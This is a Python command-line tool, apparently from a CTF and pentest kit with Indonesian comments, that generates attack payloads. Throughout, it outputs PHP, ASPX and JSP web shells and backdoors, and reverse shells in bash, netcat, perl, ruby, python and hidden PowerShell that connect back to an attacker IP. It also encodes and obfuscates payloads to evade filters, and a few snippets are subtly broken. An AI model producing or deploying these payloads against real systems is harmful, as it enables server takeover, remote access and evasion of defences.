#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""payload_gen.py — payload generator & obfuscation toolkit buat CTF & pentest.

Fitur:
  - php: PHP payload (command, file, backdoor, reverse shell)
  - aspx: ASPX payload (command, eval, file)
  - jsp: JSP payload (command, reverse shell)
  - python: Python payload (command, reverse shell)
  - reverse: reverse shell payload (bash, python, php, netcat)
  - encode: encode payload (base64, hex, url, unicode)
  - obfuscate: obfuscate payload (comment, case, variable)

    python3 payload_gen.py php --method command --param c
    python3 payload_gen.py reverse --type bash --ip 10.0.0.1 --port 4444
    python3 payload_gen.py encode --payload '<?php system($_GET["c"]); ?>' --method base64
    python3 payload_gen.py obfuscate --payload '<?php eval($_GET["c"]); ?>' --method comment
"""
import argparse, base64, os, random, re, string, sys

# ============ PHP Payloads ============

def php_payload(method="command", param="c"):
    payloads = {
        "command": f'<?php if(isset($_GET["{param}"])){{ system($_GET["{param}"]); }} ?>',
        "eval": f'<?php eval($_GET["{param}"]); ?>',
        "base64": f'<?php eval(base64_decode($_GET["{param}"])); ?>',
        "shell": f'<?php $s=shell_exec($_GET["{param}"]); echo $s; ?>',
        "file": f'<?php file_put_contents($_GET["f"], base64_decode($_GET["d"])); ?>',
        "backdoor": f'<?php $c=$_GET["{param}"]; if(strlen($c)>0){{ system($c); }} ?>',
        "info": f'<?php phpinfo(); ?>',
        "upload": f'<?php move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); ?>',
    }
    return payloads.get(method, payloads["command"])

# ============ ASPX Payloads ============

def aspx_payload(method="command", param="c"):
    payloads = {
        "command": f'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["{param}"]); %>',
        "eval": f'<%@ Page Language="C#" %><% eval(Request["{param}"]); %>',
        "file": f'<%@ Page Language="C#" %><% System.IO.File.WriteAllText(Request["f"], Request["d"]); %>',
        "shell": f'<%@ Page Language="C#" %><% var p = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c "+Request["{param}"]){{ p.RedirectStandardOutput = true; p.UseShellExecute = false; }}; var r = System.Diagnostics.Process.Start(p); var s = r.StandardOutput.ReadToEnd(); Response.Write(s); %>',
    }
    return payloads.get(method, payloads["command"])

# ============ JSP Payloads ============

def jsp_payload(method="command", param="c"):
    payloads = {
        "command": f'<% Runtime.getRuntime().exec(request.getParameter("{param}")); %>',
        "eval": f'<% if(request.getParameter("{param}")!=null){{ Runtime.getRuntime().exec(request.getParameter("{param}")); }} %>',
        "shell": f'<% Runtime r = Runtime.getRuntime(); Process p = r.exec(request.getParameter("{param}")); java.io.InputStream i = p.getInputStream(); int c; while((c=i.read())!=-1){{ out.print((char)c); }} %>',
        "file": f'<% byte[] b = org.apache.commons.codec.binary.Base64.decodeBase64(request.getParameter("d")); java.nio.file.Files.write(java.nio.file.Paths.get(request.getParameter("f")), b); %>',
    }
    return payloads.get(method, payloads["command"])

# ============ Python Payloads ============

def python_payload(method="command", param="c"):
    payloads = {
        "command": f'import os; os.system(os.environ.get("{param}",""))',
        "eval": f'eval(__import__("os").environ.get("{param}",""))',
        "shell": f'import subprocess; subprocess.run(["/bin/sh","-c",os.environ.get("{param}","")])',
        "reverse": f'import socket,subprocess,os; s=socket.socket(); s.connect(("{param}",int(os.environ.get("PORT","4444")))); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.run(["/bin/sh","-i"])',
    }
    return payloads.get(method, payloads["command"])

# ============ Reverse Shell ============

def reverse_shell(shell_type="bash", ip="10.0.0.1", port=4444):
    shells = {
        "bash": f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        "python": f'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{ip}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run([\'/bin/sh\',\'-i\'])"',
        "php": f'php -r \'$s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "netcat": f'nc -e /bin/sh {ip} {port}',
        "perl": f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        "ruby": f'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
        "powershell": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
    }
    return shells.get(shell_type, shells["bash"])

# ============ Encoding ============

def encode_payload(payload, method="base64"):
    encoders = {
        "base64": lambda p: base64.b64encode(p.encode()).decode(),
        "hex": lambda p: p.encode().hex(),
        "url": lambda p: "".join(f"%{ord(c):02x}" for c in p),
        "unicode": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
        "double-url": lambda p: "".join(f"%{ord(c):02x}" for c in "".join(f"%{ord(c):02x}" for c in p)),
        "html": lambda p: "".join(f"&#{ord(c)};" for c in p),
        "octal": lambda p: "".join(f"\\{ord(c):03o}" for c in p),
        "binary": lambda p: "".join(f"{ord(c):08b}" for c in p),
    }
    fn = encoders.get(method)
    if not fn:
        print(f"[-] Method tidak dikenal: {method}")
        return None
    return fn(payload)

# ============ Obfuscation ============

def obfuscate_payload(payload, method="comment"):
    if method == "comment":
        # Insert PHP comments
        result = []
        for c in payload:
            result.append(c)
            if c in ";{}()":
                result.append(f"/*{''.join(random.choices(string.ascii_lowercase, k=3))}*/")
        return "".join(result)
    elif method == "case":
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    elif method == "variable":
        # Replace variables with random names
        vars_found = set(re.findall(r'\$\w+', payload))
        mapping = {}
        for var in vars_found:
            mapping[var] = "$" + "".join(random.choices(string.ascii_lowercase, k=8))
        result = payload
        for old, new in mapping.items():
            result = result.replace(old, new)
        return result
    elif method == "concat":
        # Concatenate strings
        parts = payload.split("'")
        if len(parts) > 1:
            return ".".join(f"'{p}'" for p in parts)
        parts = payload.split('"')
        if len(parts) > 1:
            return ".".join(f'"{p}"' for p in parts)
        return payload
    elif method == "hex-var":
        # Convert to hex variables
        result = []
        for c in payload:
            if c.isalpha():
                result.append(f"\\x{ord(c):02x}")
            else:
                result.append(c)
        return "".join(result)
    else:
        print(f"[-] Method tidak dikenal: {method}")
        return None

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        return
    cmd = args[0]
    if cmd == "php":
        p = argparse.ArgumentParser()
        p.add_argument("--method", default="command")
        p.add_argument("--param", default="c")
        a = p.parse_args(args[1:])
        print(php_payload(a.method, a.param))
    elif cmd == "aspx":
        p = argparse.ArgumentParser()
        p.add_argument("--method", default="command")
        p.add_argument("--param", default="c")
        a = p.parse_args(args[1:])
        print(aspx_payload(a.method, a.param))
    elif cmd == "jsp":
        p = argparse.ArgumentParser()
        p.add_argument("--method", default="command")
        p.add_argument("--param", default="c")
        a = p.parse_args(args[1:])
        print(jsp_payload(a.method, a.param))
    elif cmd == "python":
        p = argparse.ArgumentParser()
        p.add_argument("--method", default="command")
        p.add_argument("--param", default="c")
        a = p.parse_args(args[1:])
        print(python_payload(a.method, a.param))
    elif cmd == "reverse":
        p = argparse.ArgumentParser()
        p.add_argument("--type", default="bash", choices=["bash", "python", "php", "netcat", "perl", "ruby", "powershell"])
        p.add_argument("--ip", default="10.0.0.1")
        p.add_argument("--port", type=int, default=4444)
        a = p.parse_args(args[1:])
        print(reverse_shell(a.type, a.ip, a.port))
    elif cmd == "encode":
        p = argparse.ArgumentParser()
        p.add_argument("--payload", required=True)
        p.add_argument("--method", default="base64", choices=["base64", "hex", "url", "unicode", "double-url", "html", "octal", "binary"])
        a = p.parse_args(args[1:])
        result = encode_payload(a.payload, a.method)
        if result:
            print(result)
    elif cmd == "obfuscate":
        p = argparse.ArgumentParser()
        p.add_argument("--payload", required=True)
        p.add_argument("--method", default="comment", choices=["comment", "case", "variable", "concat", "hex-var"])
        a = p.parse_args(args[1:])
        result = obfuscate_payload(a.payload, a.method)
        if result:
            print(result)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
